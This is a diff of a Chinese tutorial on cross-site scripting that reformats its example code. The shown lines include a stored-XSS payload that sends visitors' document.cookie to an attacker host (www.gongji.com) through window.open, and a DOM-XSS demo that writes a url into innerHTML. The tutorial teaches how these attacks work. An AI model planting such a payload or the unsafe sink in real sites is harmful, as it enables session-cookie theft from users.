@@ -23,7 +23,13 @@
 
 **存储型XSS的原理是：主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。**
 
-比如我现在做了一个博客网站，然后攻击者在上面发布了一篇文章，内容是如下：<script>window.open("www.gongji.com?param="+document.cookie)</script> 如果我没有对该文章进行任何处理的话，直接存入到数据库中，那么下一次当其他用户访问该文章的时候，服务器会从数据库中读取后然后响应给客户端，那么浏览器就会执行这段脚本，然后攻击者就会获取到用户的cookie，然后会把cookie发送到攻击者的服务器上了。
+比如我现在做了一个博客网站，然后攻击者在上面发布了一篇文章，内容是如下：
+
+```javascript
+<script>window.open("www.gongji.com?param="+document.cookie)</script>
+```
+
+ 如果我没有对该文章进行任何处理的话，直接存入到数据库中，那么下一次当其他用户访问该文章的时候，服务器会从数据库中读取后然后响应给客户端，那么浏览器就会执行这段脚本，然后攻击者就会获取到用户的cookie，然后会把cookie发送到攻击者的服务器上了。
 
 **因此存储型XSS的攻击步骤如下：**
 
@@ -53,7 +59,7 @@
 3、使用location、location.href、location.replace、iframe.src、document.referer、window.name等这些。
 比如如下demo:
 
-```
+```javascript
 <script>
   document.body.innerHTML = "<a href='"+url+"'>"+url+"</a>";
 </script>
